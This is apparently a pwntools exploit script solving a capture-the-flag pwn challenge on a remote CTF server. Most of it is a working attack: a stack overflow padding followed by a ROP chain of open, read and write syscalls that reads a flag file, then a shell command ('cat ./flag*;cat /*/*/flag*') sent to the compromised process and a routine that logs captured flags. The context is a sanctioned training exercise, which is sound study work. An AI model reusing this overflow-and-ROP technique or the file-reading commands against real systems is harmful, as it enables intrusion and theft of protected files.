#!/usr/bin/python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 0
if LOCAL:
    io = process(["docker", "run", "-i", "2bf1c336ac5a"])
else:
    remote_service = "ctf.nbs.jonbgua.com 32129"
    remote_service = remote_service.strip().split(" ")
    io = remote(remote_service[0], int(remote_service[1]))


rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
i2b = lambda c: str(c).encode()
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))


def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass


ru(b"token")
sl(input("YOUR TOKEN: ").encode())

ru(b"Challenge")
ru(b":")
sl(i2b(3))

# ===========exp starts===========
syscall_ret = 0x0000000000425E04
pop_rdi_ret = 0x00000000004018C2
pop_rsi_ret = 0x0000000000402828
pop_rdx_ret = 0x00000000004017CF
pop_rax_ret = 0x00000000004583C7
#  str_flag    = next(elf.search(b"/home/task3/flag4\x00"))
str_flag = 0x004A4019
buf_addr = 0x4DF000 + 0x800

#  ru(b'Give me your data: \n')
payload = b"a" * (0x20 + 8 + 0x10)

#  open("/flag", 0, 0);
payload += p64(pop_rdi_ret) + p64(str_flag)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(syscall_ret)

#  read(3, buf, 0x40);
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(buf_addr)
payload += p64(pop_rdx_ret) + p64(0x40)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(syscall_ret)

#  write(1, buf, 0x40)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rax_ret) + p64(1)
payload += p64(syscall_ret)

s(payload)
# ===========exp ends=============

lg = lambda s: log.info("\033[1;31;40m%s\033[0m" % (s))


def success(flag="", catflag=b"cat ./flag*;cat /*/*/flag*", chal_id=-1):
    if flag == "":
        io.recv(timeout=1)
        sl(catflag)
        ru(b"flag{")
        flag = (b"flag{" + ru(b"\n", "drop")).decode()
    assert ("{" in flag) and ("}" in flag)
    if chal_id != -1:
        res = post_flag(flag, chal_id)
        if res:
            if res == -1:
                lg("[WRONG] : " + flag)
                exit()
            elif res == -2:
                import time

                time.sleep(10)
                post_flag(flag, chal_id)
    lg(flag)
    import json

    try:
        with open("./flags.txt", "r") as fd:
            all_flags = json.loads(fd.read())
            for i in all_flags:
                if i["chal_port"] == io.rport:
                    if i["flag"] == flag:
                        exit()
                    else:
                        lg("[Different flag: ]" + i["flag"])
    except Exception:
        all_flags = []
    with open("./flags.txt", "w") as fd:
        chal_data = {"chal_port": io.rport, "flag": flag}
        all_flags.append(chal_data)
        fd.write(
            json.dumps(all_flags, sort_keys=True, indent=4, separators=(",", ": "))
        )
        fd.write("\n")


success()
ia()
